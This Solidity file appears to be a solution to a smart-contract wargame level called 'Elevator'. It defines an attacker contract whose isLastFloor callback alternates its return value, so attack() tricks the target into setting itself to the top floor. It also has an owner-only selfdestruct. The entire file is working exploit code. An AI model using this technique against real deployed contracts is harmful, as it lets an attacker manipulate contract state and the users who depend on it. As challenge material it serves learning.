pragma solidity ^0.5.0;

import 'https://github.com/OpenZeppelin/openzeppelin-solidity/contracts/ownership/Ownable.sol';

interface Elevator {
    function goTo(uint _floor) external;
}

contract FakeBuilding is Ownable {
    Elevator elevator = Elevator(0xC53650E36c40Ee4f14E364D64f723E4CF6428AA9);
    bool flip = true;

    function isLastFloor(uint) public returns (bool) {
        flip = !flip;
        return flip;
    }

    function attack() external {
        elevator.goTo(10);
    }

    function destroy() external onlyOwner {
        selfdestruct(msg.sender);
    }
}
